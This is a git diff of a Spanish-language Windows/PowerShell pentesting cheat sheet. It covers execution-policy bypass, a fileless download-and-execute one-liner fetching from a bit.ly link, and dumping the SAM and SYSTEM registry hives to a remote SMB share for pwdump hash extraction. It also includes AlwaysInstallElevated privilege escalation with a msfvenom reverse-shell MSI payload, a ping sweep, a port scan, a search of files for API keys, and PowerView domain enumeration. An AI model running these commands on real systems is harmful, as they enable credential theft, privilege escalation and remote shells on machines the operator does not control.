@@ -1,11 +1,18 @@
 # iniciar powershell con permisos para correr scripts
 powershell.exe -nop -exec bypass
 
-# importar un modulo
+# importar modulos
 Import-Module PowerUp.ps1
 
 # oneLiner para correr un script
 C:\> powershell.exe -exec bypass -Command “& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}”
+
+# oneLiner para hacer un ping sweep
+1..15 | %{echo "10.0.0.$_"; ping -n2 10.0.0.$_ | Select-String ttl}
+
+# oneLiner para hacer un escaneo de puertos
+1..1024 | %{echo ((New-Object Net.Sockets.TcpClient).Connect("10.0.0.$_")) "Puerto Abierto: $_"} 2>$null
+for ($i=130; $i -le 140; $i++){Test-NetConnection localhost -Port $i}
 
 # Descargar + ejecutar sin tocar el disco
 C:\> powershell.exe -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/1mK64oH’); Invoke-AllChecks”
@@ -40,22 +47,82 @@ reg save HKLM\SYSTEM system.backup
 -
 copy sam.backup \\IP\smbfolder\sam
 copy system.backup \\IP\smbfolder\system
-<<<<<<< HEAD
 -
-pwdump system sam
+pwdump system sam --> lista los hashes de las contraseñas
+
+----
+# AlwaysInstallElevated exploit
+# consultar el estado 
+reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+# payload
+msfvenom -p windows/shell/reverse_tcp LHOST=ip LPORT=port -f msi -o payload.msi
+----
 
 # CMD
 tasklist
 taskkill /pid 1234
 taskkill /F /IM notepad.exe
-systeminfo
-
-=======
-pwdump system sam
-
-# comandos
 whoami /priv
-Start-Process "shell.exe"
+
+Start-Process notepad.exe
+Get-Process -Name notepad
+Get-Process | Export-Csv running_processes.csv
+Get-Content ips.txt # similar a cat ips.txt
+Copy-Item ips.txt backup_ips.txt
+Move-Item ips.txt backup_ips.txt
+Get-FileHash -Algorithm MD5 ips.txt
+Get-HotFix | Format-list | findstr 'InstalledOn' 
+Get-HotFix | Format-list | findstr /C:'HotFixID' /C:'InstalledOn' # multiples busquedas
+(Get-NetUser).name # filtra solo el criterio "name"
+
+# busqueda de archivos/texto
+Get-ChildItem -Path C:\ -Filter 'interesting-file*' -Recurse
+Get-ChildItem -Path C:\ -Filter *.bak* -Recurse
+Get-ChildItem -Path C:\ -recurse | Select-String -Pattern 'API_KEY'
+
+# b64 Decoding
+certutil -decode "C:\Users\Administrator\Desktop\b64.txt" out.txt 
+$file = ".\b64.txt"; $data = Get-Content $file; [System.Text.Encoding]::Ascii.GetString([System.Convert]::FromBase64String($data))
+
 systeminfo
 net localgroup Administrators --> lista los miembros del grupo Administrators
->>>>>>> cb59de22e3ba1c8e35002a1a078dcb7ee8b547a3
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run --> consulta los programas en autorun
+icacls.exe c:\\windows\system32\SecurityHealthSystray.exe --> muestra los permisos de ejecución de un ejecutable
+----
+# https://gist.github.com/HarmJ0y/3328d954607d71362e3c
+# PowerView
+Import-Module powerview.ps1	
+
+# Muestra el propietario de un archivo/carpeta
+get-acl C:\
+
+# Lista los usuarios y filtra por nombre o descripción
+Get-Localuser
+Get-Localuser -SID 'sid'
+(Get-NetUser).description
+(Get-NetUser).name
+	
+# usuarios deshabilitados
+Get-NetUser -Filter "(userAccountControl:1.2.840.113556.1.4.803:=2)"
+
+# muestra los miembros de cada grupo
+Get-NetGroupMember 'Domain admins'
+
+# Muestra recursos compartidos con permisos de lectura
+Find-DomainShare -CheckShareAccess
+
+# Enumera GPOs
+Get-NetGPO
+
+# Lista ip address
+Get-NetIPAdress
+ifconfig
+
+# Lista puertos en "escucha"
+Get-NetTCPConnection -State Listen | measure
+
+# Buscar puertos abiertos
+Test-NetConnection -ComputerName localhost -Port 443
+
